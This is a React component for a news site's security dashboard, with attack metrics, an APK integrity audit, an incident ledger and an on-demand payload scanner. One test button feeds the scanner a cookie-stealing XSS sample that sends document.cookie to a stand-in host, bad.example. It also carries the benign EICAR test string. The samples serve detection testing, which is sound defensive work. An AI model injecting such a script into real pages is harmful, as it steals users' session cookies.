import {
  CheckCircle2,
  FileSearch,
  Lock,
  RefreshCw,
  ShieldAlert,
  ShieldCheck,
  Upload
} from 'lucide-react';
import { useEffect, useState, type ChangeEvent, type FormEvent } from 'react';

export interface SecurityIncidentItem {
  id: string;
  timestamp: string;
  layer: 'WAF' | 'Malware Scanner' | 'Rate Limiter' | 'Integrity Guard' | 'Prototype Shield';
  severity: 'Critical' | 'High' | 'Medium' | 'Info';
  category: string;
  ruleMatched: string;
  targetPath: string;
  clientIpMasked: string;
  actionTaken:
    | 'Blocked (403)'
    | 'Rate Limited (429)'
    | 'Quarantined (422)'
    | 'Sanitized'
    | 'Verified Clean';
  details: string;
}

export interface ApkIntegrityReport {
  filename: string;
  packageId: string;
  actualSha256: string;
  expectedSha256: string;
  sha256Match: boolean;
  dexHeaderValid: boolean;
  manifestVerified: boolean;
  entriesAudited: Array<{
    name: string;
    declaredDigest: string;
    computedDigest: string;
    match: boolean;
  }>;
  permissionsDetected: string[];
  disallowedPermissionsFound: string[];
  malwareScanClean: boolean;
  verdict: 'Verified Clean' | 'Tampered / Compromised';
  auditedAt: string;
}

export interface SecurityStatusResponse {
  protectionActive: boolean;
  engineSummary: string;
  layers: Array<{
    id: string;
    name: string;
    status: string;
    detail: string;
  }>;
  metrics: {
    blockedAttacksCount: number;
    quarantinedFilesCount: number;
    rateLimitedCount: number;
    sanitizedPayloadsCount: number;
    scansExecutedCount: number;
  };
  lastApkAudit: ApkIntegrityReport | null;
  recentIncidents: SecurityIncidentItem[];
}

interface PayloadScanResult {
  scanId: string;
  clean: boolean;
  verdict: string;
  threatCategory: string | null;
  ruleMatched: string | null;
  severity: string;
  fileTypeDetected: string;
  sha256: string;
  bytesScanned: number;
  scannedAt: string;
  details: string;
}

const EICAR_DIAGNOSTIC_SAMPLE =
  'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';

export function SecurityShieldSection() {
  const [statusData, setStatusData] = useState<SecurityStatusResponse | null>(null);
  const [loadingStatus, setLoadingStatus] = useState<boolean>(true);
  const [verifyingApk, setVerifyingApk] = useState<boolean>(false);
  const [apkReport, setApkReport] = useState<ApkIntegrityReport | null>(null);

  const [scanFileName, setScanFileName] = useState<string>('');
  const [scanBase64, setScanBase64] = useState<string>('');
  const [scanTextInput, setScanTextInput] = useState<string>('');
  const [scanning, setScanning] = useState<boolean>(false);
  const [scanResult, setScanResult] = useState<PayloadScanResult | null>(null);
  const [scanError, setScanError] = useState<string | null>(null);

  const fetchSecurityStatus = async () => {
    try {
      const res = await fetch('/api/security/status');
      if (!res.ok) return;
      const json = (await res.json()) as SecurityStatusResponse;
      setStatusData(json);
      if (json.lastApkAudit) {
        setApkReport(json.lastApkAudit);
      }
    } catch {
      // Non-fatal load error
    } finally {
      setLoadingStatus(false);
    }
  };

  useEffect(() => {
    void fetchSecurityStatus();
  }, []);

  const handleVerifyApk = async () => {
    setVerifyingApk(true);
    try {
      const res = await fetch('/api/security/verify-apk', { method: 'POST' });
      const payload = (await res.json()) as {
        report: ApkIntegrityReport;
        status: SecurityStatusResponse;
      };
      if (res.ok) {
        setApkReport(payload.report);
        setStatusData(payload.status);
      }
    } catch {
      // Ignore transient network failure
    } finally {
      setVerifyingApk(false);
    }
  };

  const handleFileSelect = (e: ChangeEvent<HTMLInputElement>) => {
    setScanError(null);
    const file = e.target.files?.[0];
    if (!file) return;
    setScanFileName(file.name);
    const slice = file.slice(0, 262144);
    const reader = new FileReader();
    reader.onload = () => {
      const dataUrl = typeof reader.result === 'string' ? reader.result : '';
      const commaIdx = dataUrl.indexOf(',');
      setScanBase64(commaIdx >= 0 ? dataUrl.slice(commaIdx + 1) : '');
    };
    reader.readAsDataURL(slice);
  };

  const runSecurityScan = async (override?: {
    fileName?: string;
    base64Content?: string;
    textPayload?: string;
  }) => {
    setScanError(null);
    const targetFileName = override?.fileName ?? scanFileName;
    const targetBase64 = override?.base64Content ?? scanBase64;
    const targetText = override?.textPayload ?? scanTextInput;

    if (!targetBase64.trim() && !targetText.trim()) {
      setScanError('Select a file or enter text, URL, or code payload to inspect.');
      return;
    }

    setScanning(true);
    try {
      const res = await fetch('/api/security/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fileName: targetFileName || undefined,
          base64Content: targetBase64 || undefined,
          textPayload: targetText || undefined
        })
      });
      const payload = await res.json();
      if (!res.ok) {
        throw new Error(payload.error || 'Security scan could not be completed.');
      }
      setScanResult(payload.scan as PayloadScanResult);
      setStatusData(payload.status as SecurityStatusResponse);
    } catch (err: unknown) {
      setScanError(err instanceof Error ? err.message : 'Unable to execute malware scan.');
    } finally {
      setScanning(false);
    }
  };

  const handleScanSubmit = (e: FormEvent) => {
    e.preventDefault();
    void runSecurityScan();
  };

  const metrics = statusData?.metrics;
  const activeApkAudit = apkReport ?? statusData?.lastApkAudit ?? null;
  const incidents = statusData?.recentIncidents ?? [];

  return (
    <section
      id="security-defense"
      className="border-t border-[#E5E2DC] dark:border-[#2C2A26] bg-white dark:bg-[#141413]"
    >
      <div className="max-w-7xl mx-auto px-4 sm:px-8 py-14 sm:py-20 space-y-10">
        {/* Header */}
        <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-6 pb-6 border-b border-[#E5E2DC] dark:border-[#2C2A26]">
          <div className="max-w-2xl">
            <p className="text-xs font-semibold text-[#14532D] dark:text-[#4ADE80] mb-1.5 flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Cyberattack Firewall, Malware Quarantine &amp; APK Integrity Defense</span>
            </p>
            <h2 className="font-serif text-3xl sm:text-4xl font-bold text-[#141413] dark:text-[#F5F3EE] mb-2">
              Platform Security &amp; App Virus Protection
            </h2>
            <p className="text-sm sm:text-base text-[#44403C] dark:text-[#D6D3CD] leading-relaxed">
              Multi-layer protection defending News Hub 24+ against injection attacks, DDoS floods, prototype pollution, disguised executable uploads, and tampered Android packages.
            </p>
          </div>

          <button
            type="button"
            disabled={verifyingApk}
            onClick={() => void handleVerifyApk()}
            className="inline-flex items-center gap-2 px-4 py-2.5 text-xs font-semibold text-white bg-[#14532D] hover:bg-[#166534] dark:bg-[#15803D] dark:hover:bg-[#16A34A] rounded-md disabled:opacity-50 transition-colors whitespace-nowrap shrink-0 self-start"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${verifyingApk ? 'animate-spin' : ''}`} />
            <span>{verifyingApk ? 'Verifying APK…' : 'Verify APK Integrity'}</span>
          </button>
        </div>

        {/* 5-Column Defense Metrics Strip */}
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-6 pb-8 border-b border-[#E5E2DC] dark:border-[#2C2A26]">
          <div>
            <p className="text-xs text-[#57534E] dark:text-[#A8A29E] mb-1">Cyberattacks Blocked</p>
            <p className="font-serif text-2xl sm:text-3xl font-bold text-[#141413] dark:text-[#F5F3EE] tabular-nums">
              {loadingStatus ? '—' : (metrics?.blockedAttacksCount ?? 0).toLocaleString()}
            </p>
            <p className="font-mono text-xs text-[#57534E] dark:text-[#A8A29E] mt-0.5">WAF HTTP 403</p>
          </div>
          <div>
            <p className="text-xs text-[#57534E] dark:text-[#A8A29E] mb-1">Files Quarantined</p>
            <p className="font-serif text-2xl sm:text-3xl font-bold text-[#991B1B] dark:text-[#F87171] tabular-nums">
              {loadingStatus ? '—' : (metrics?.quarantinedFilesCount ?? 0).toLocaleString()}
            </p>
            <p className="font-mono text-xs text-[#57534E] dark:text-[#A8A29E] mt-0.5">Malware HTTP 422</p>
          </div>
          <div>
            <p className="text-xs text-[#57534E] dark:text-[#A8A29E] mb-1">Flood Requests Throttled</p>
            <p className="font-serif text-2xl sm:text-3xl font-bold text-[#141413] dark:text-[#F5F3EE] tabular-nums">
              {loadingStatus ? '—' : (metrics?.rateLimitedCount ?? 0).toLocaleString()}
            </p>
            <p className="font-mono text-xs text-[#57534E] dark:text-[#A8A29E] mt-0.5">Rate Limit HTTP 429</p>
          </div>
          <div>
            <p className="text-xs text-[#57534E] dark:text-[#A8A29E] mb-1">Payloads Sanitized</p>
            <p className="font-serif text-2xl sm:text-3xl font-bold text-[#141413] dark:text-[#F5F3EE] tabular-nums">
              {loadingStatus ? '—' : (metrics?.sanitizedPayloadsCount ?? 0).toLocaleString()}
            </p>
            <p className="font-mono text-xs text-[#57534E] dark:text-[#A8A29E] mt-0.5">Prototype Shield</p>
          </div>
          <div>
            <p className="text-xs text-[#57534E] dark:text-[#A8A29E] mb-1">APK Security Status</p>
            <p className="font-serif text-2xl sm:text-3xl font-bold text-[#14532D] dark:text-[#4ADE80] tabular-nums">
              {activeApkAudit?.verdict === 'Verified Clean' ? 'Clean' : 'Checking'}
            </p>
            <p className="font-mono text-xs text-[#14532D] dark:text-[#4ADE80] mt-0.5">
              {(metrics?.scansExecutedCount ?? 0).toLocaleString()} scans run
            </p>
          </div>
        </div>

        {/* Active Protection Layers */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
          {(statusData?.layers ?? []).map((layer) => (
            <div
              key={layer.id}
              className="p-4 bg-[#FBF9F5] dark:bg-[#1C1B19] border border-[#E5E2DC] dark:border-[#2C2A26] rounded-md space-y-1.5"
            >
              <div className="flex items-center justify-between gap-2">
                <span className="text-xs font-semibold text-[#141413] dark:text-[#F5F3EE]">
                  {layer.name}
                </span>
                <span className="font-mono text-[11px] font-semibold text-[#14532D] dark:text-[#4ADE80]">
                  {layer.status}
                </span>
              </div>
              <p className="text-xs text-[#57534E] dark:text-[#A8A29E] leading-relaxed">
                {layer.detail}
              </p>
            </div>
          ))}
        </div>

        {/* Two-Column Console: On-Demand Virus/Attack Scanner + APK Manifest Audit */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Left 6 Cols: Interactive Malware & Cyberattack Scanner */}
          <form
            onSubmit={handleScanSubmit}
            noValidate
            className="lg:col-span-6 p-6 bg-[#FBF9F5] dark:bg-[#1C1B19] border border-[#DFDBD2] dark:border-[#2E2C28] rounded-lg space-y-4"
          >
            <div className="flex items-center justify-between gap-2 pb-3 border-b border-[#E5E2DC] dark:border-[#2C2A26]">
              <div className="flex items-center gap-2">
                <FileSearch className="w-4 h-4 text-[#991B1B] dark:text-[#F87171]" />
                <h3 className="font-serif text-xl font-bold text-[#141413] dark:text-[#F5F3EE]">
                  File, Binary &amp; Payload Virus Scanner
                </h3>
              </div>
              <span className="font-mono text-[11px] text-[#57534E] dark:text-[#A8A29E]">
                Magic-Byte + Signature
              </span>
            </div>

            <div className="space-y-3">
              <div>
                <label
                  htmlFor="security-file-input"
                  className="block text-xs font-medium text-[#292524] dark:text-[#D6D3CD] mb-1.5"
                >
                  Inspect Local File Header &amp; Bytes (Up to 256 KB slice)
                </label>
                <label
                  htmlFor="security-file-input"
                  className="flex items-center justify-between gap-3 px-3.5 py-2.5 bg-white dark:bg-[#141413] border border-dashed border-[#D6D1C7] dark:border-[#3A3732] rounded-md cursor-pointer hover:border-[#141413] dark:hover:border-[#F5F3EE] transition-colors text-xs"
                >
                  <span className="flex items-center gap-2 text-[#44403C] dark:text-[#D6D3CD] truncate">
                    <Upload className="w-4 h-4 shrink-0 text-[#991B1B] dark:text-[#F87171]" />
                    <span className="truncate">
                      {scanFileName ? `Selected: ${scanFileName}` : 'Choose a file to check for malware or spoofing…'}
                    </span>
                  </span>
                  <span className="font-mono text-[11px] font-semibold text-[#141413] dark:text-[#F5F3EE] shrink-0">
                    Browse
                  </span>
                </label>
                <input
                  id="security-file-input"
                  type="file"
                  onChange={handleFileSelect}
                  className="sr-only"
                />
              </div>

              <div>
                <label
                  htmlFor="security-text-input"
                  className="block text-xs font-medium text-[#292524] dark:text-[#D6D3CD] mb-1"
                >
                  Or Paste Script, URL, or Suspicious Payload
                </label>
                <textarea
                  id="security-text-input"
                  rows={3}
                  value={scanTextInput}
                  onChange={(e) => setScanTextInput(e.target.value)}
                  placeholder="Paste any file string, script snippet, or link to test detection…"
                  className="w-full px-3 py-2 text-xs font-mono bg-white dark:bg-[#141413] border border-[#D6D1C7] dark:border-[#3A3732] rounded-md text-[#141413] dark:text-[#F5F3EE] placeholder:text-[#78716C] focus:outline-none focus:border-[#141413] dark:focus:border-[#F5F3EE]"
                />
              </div>

              <div className="flex flex-wrap items-center gap-2 pt-1">
                <button
                  type="button"
                  onClick={() => {
                    setScanFileName('eicar-test.com.txt');
                    setScanBase64('');
                    setScanTextInput(EICAR_DIAGNOSTIC_SAMPLE);
                    void runSecurityScan({
                      fileName: 'eicar-test.com.txt',
                      base64Content: '',
                      textPayload: EICAR_DIAGNOSTIC_SAMPLE
                    });
                  }}
                  className="px-2.5 py-1.5 text-[11px] font-medium text-[#991B1B] dark:text-[#FCA5A5] bg-white dark:bg-[#141413] border border-[#FECACA] dark:border-[#7F1D1D] rounded-md hover:bg-[#FEF2F2] dark:hover:bg-[#2A1515] whitespace-nowrap"
                >
                  Test EICAR Virus Signature
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const sample = "<script>fetch('https://bad.example/steal?c='+document.cookie)</script>";
                    setScanFileName('');
                    setScanBase64('');
                    setScanTextInput(sample);
                    void runSecurityScan({
                      fileName: '',
                      base64Content: '',
                      textPayload: sample
                    });
                  }}
                  className="px-2.5 py-1.5 text-[11px] font-medium text-[#44403C] dark:text-[#D6D3CD] bg-white dark:bg-[#141413] border border-[#D6D1C7] dark:border-[#3A3732] rounded-md hover:border-[#141413] dark:hover:border-[#F5F3EE] whitespace-nowrap"
                >
                  Test XSS Script Probe
                </button>
                <button
                  type="button"
                  onClick={() => {
                    const cleanText = 'Verified Geneva Wire Press Release 2026 — News Hub 24+';
                    setScanFileName('dispatch.txt');
                    setScanBase64('');
                    setScanTextInput(cleanText);
                    void runSecurityScan({
                      fileName: 'dispatch.txt',
                      base64Content: '',
                      textPayload: cleanText
                    });
                  }}
                  className="px-2.5 py-1.5 text-[11px] font-medium text-[#14532D] dark:text-[#4ADE80] bg-white dark:bg-[#141413] border border-[#BBF7D0] dark:border-[#166534] rounded-md hover:bg-[#F0FDF4] dark:hover:bg-[#0E2416] whitespace-nowrap"
                >
                  Test Clean Dispatch
                </button>
              </div>
            </div>

            {scanError && (
              <p
                role="status"
                className="text-xs font-medium px-3 py-2 rounded-md border text-[#991B1B] dark:text-[#FCA5A5] bg-[#FEF2F2] dark:bg-[#2A1515] border-[#FECACA] dark:border-[#7F1D1D]"
              >
                {scanError}
              </p>
            )}

            <button
              type="submit"
              disabled={scanning}
              className="w-full px-4 py-2.5 text-sm font-semibold text-white bg-[#141413] hover:bg-[#292524] dark:bg-[#F5F3EE] dark:text-[#141413] dark:hover:bg-[#E5E2DC] rounded-md disabled:opacity-50 transition-colors"
            >
              {scanning ? 'Scanning Payload…' : 'Scan File or Payload'}
            </button>

            {scanResult && (
              <div
                className={`p-4 rounded-md border space-y-1.5 text-xs ${
                  scanResult.clean
                    ? 'bg-[#F0FDF4] dark:bg-[#0E2416] border-[#BBF7D0] dark:border-[#166534] text-[#14532D] dark:text-[#DCFCE7]'
                    : 'bg-[#FEF2F2] dark:bg-[#2A1515] border-[#FECACA] dark:border-[#7F1D1D] text-[#991B1B] dark:text-[#FCA5A5]'
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="font-semibold flex items-center gap-1.5">
                    {scanResult.clean ? (
                      <CheckCircle2 className="w-4 h-4 shrink-0" />
                    ) : (
                      <ShieldAlert className="w-4 h-4 shrink-0" />
                    )}
                    <span>{scanResult.verdict}</span>
                  </span>
                  <span className="font-mono text-[11px]">{scanResult.scanId}</span>
                </div>
                <p>{scanResult.details}</p>
                <p className="font-mono text-[11px] opacity-90 break-all">
                  Detected: {scanResult.fileTypeDetected} · {scanResult.bytesScanned.toLocaleString()} bytes · SHA-256 {scanResult.sha256.slice(0, 20)}…
                </p>
              </div>
            )}
          </form>

          {/* Right 6 Cols: APK Integrity Audit & Recent Threat Quarantine Log */}
          <div className="lg:col-span-6 space-y-6">
            {/* APK Cryptographic Audit Card */}
            <div className="bg-[#FBF9F5] dark:bg-[#1C1B19] border border-[#E5E2DC] dark:border-[#2C2A26] rounded-lg overflow-hidden">
              <div className="px-5 py-3.5 bg-[#F5F2EB] dark:bg-[#242320] border-b border-[#E5E2DC] dark:border-[#2C2A26] flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[#14532D] dark:text-[#4ADE80]" />
                  <h3 className="font-serif text-base font-semibold text-[#141413] dark:text-[#F5F3EE]">
                    Android APK Cryptographic &amp; Permission Audit
                  </h3>
                </div>
                <span
                  className={`font-mono text-xs font-semibold ${
                    activeApkAudit?.verdict === 'Verified Clean'
                      ? 'text-[#14532D] dark:text-[#4ADE80]'
                      : 'text-[#991B1B] dark:text-[#F87171]'
                  }`}
                >
                  {activeApkAudit?.verdict ?? 'Pending Audit'}
                </span>
              </div>

              {activeApkAudit && (
                <div className="p-5 space-y-3 text-xs">
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 pb-3 border-b border-[#E5E2DC] dark:border-[#2C2A26] font-mono">
                    <div>
                      <p className="text-[11px] text-[#57534E] dark:text-[#A8A29E]">Archive SHA-256</p>
                      <p className="font-semibold text-[#14532D] dark:text-[#4ADE80]">
                        {activeApkAudit.sha256Match ? 'Exact Match' : 'Mismatch'}
                      </p>
                    </div>
                    <div>
                      <p className="text-[11px] text-[#57534E] dark:text-[#A8A29E]">DEX Bytecode Header</p>
                      <p className="font-semibold text-[#14532D] dark:text-[#4ADE80]">
                        {activeApkAudit.dexHeaderValid ? 'Valid DEX 035' : 'Invalid'}
                      </p>
                    </div>
                    <div>
                      <p className="text-[11px] text-[#57534E] dark:text-[#A8A29E]">Suspicious Permissions</p>
                      <p className="font-semibold text-[#14532D] dark:text-[#4ADE80]">
                        {activeApkAudit.disallowedPermissionsFound.length === 0 ? '0 Detected' : `${activeApkAudit.disallowedPermissionsFound.length} Flagged`}
                      </p>
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <p className="font-semibold text-[#141413] dark:text-[#F5F3EE]">
                      Signed META-INF/MANIFEST.MF Entries ({activeApkAudit.entriesAudited.length} verified)
                    </p>
                    <div className="divide-y divide-[#E5E2DC] dark:divide-[#2C2A26] bg-white dark:bg-[#141413] border border-[#E5E2DC] dark:border-[#2C2A26] rounded-md">
                      {activeApkAudit.entriesAudited.map((entry) => (
                        <div
                          key={entry.name}
                          className="px-3 py-2 flex items-center justify-between gap-2 font-mono text-[11px]"
                        >
                          <span className="text-[#141413] dark:text-[#F5F3EE] truncate">
                            {entry.name}
                          </span>
                          <span
                            className={`shrink-0 font-semibold ${
                              entry.match
                                ? 'text-[#14532D] dark:text-[#4ADE80]'
                                : 'text-[#991B1B] dark:text-[#F87171]'
                            }`}
                          >
                            {entry.match ? 'SHA-256 Verified' : 'Corrupted'}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>

                  <p className="text-[11px] text-[#57534E] dark:text-[#A8A29E] font-mono">
                    Declared Android Permissions: {activeApkAudit.permissionsDetected.join(', ') || 'Minimal'}
                  </p>
                </div>
              )}
            </div>

            {/* Threat & Quarantine Audit Log */}
            <div className="bg-[#FBF9F5] dark:bg-[#1C1B19] border border-[#E5E2DC] dark:border-[#2C2A26] rounded-lg overflow-hidden">
              <div className="px-5 py-3.5 bg-[#F5F2EB] dark:bg-[#242320] border-b border-[#E5E2DC] dark:border-[#2C2A26] flex items-center justify-between gap-2">
                <h3 className="font-serif text-base font-semibold text-[#141413] dark:text-[#F5F3EE]">
                  Security Incident &amp; Quarantine Ledger
                </h3>
                <span className="font-mono text-xs text-[#57534E] dark:text-[#A8A29E] tabular-nums">
                  {incidents.length} events
                </span>
              </div>

              <div className="divide-y divide-[#E5E2DC] dark:divide-[#2C2A26] max-h-72 overflow-y-auto">
                {incidents.length === 0 ? (
                  <p className="px-5 py-6 text-xs text-[#57534E] dark:text-[#A8A29E]">
                    No cyberattacks or malware uploads detected. Run an APK verification or payload scan on the left to inspect live logging.
                  </p>
                ) : (
                  incidents.map((item) => (
                    <div key={item.id} className="px-5 py-3 space-y-1 text-xs">
                      <div className="flex items-center justify-between gap-2">
                        <span className="font-semibold text-[#141413] dark:text-[#F5F3EE] truncate">
                          {item.layer} · {item.category}
                        </span>
                        <span
                          className={`font-mono text-[11px] font-semibold shrink-0 ${
                            item.actionTaken === 'Verified Clean'
                              ? 'text-[#14532D] dark:text-[#4ADE80]'
                              : 'text-[#991B1B] dark:text-[#F87171]'
                          }`}
                        >
                          {item.actionTaken}
                        </span>
                      </div>
                      <p className="text-[11px] text-[#44403C] dark:text-[#D6D3CD]">{item.details}</p>
                      <p className="font-mono text-[11px] text-[#78716C] dark:text-[#A8A29E]">
                        {item.id} · {item.targetPath} · {item.clientIpMasked}
                      </p>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
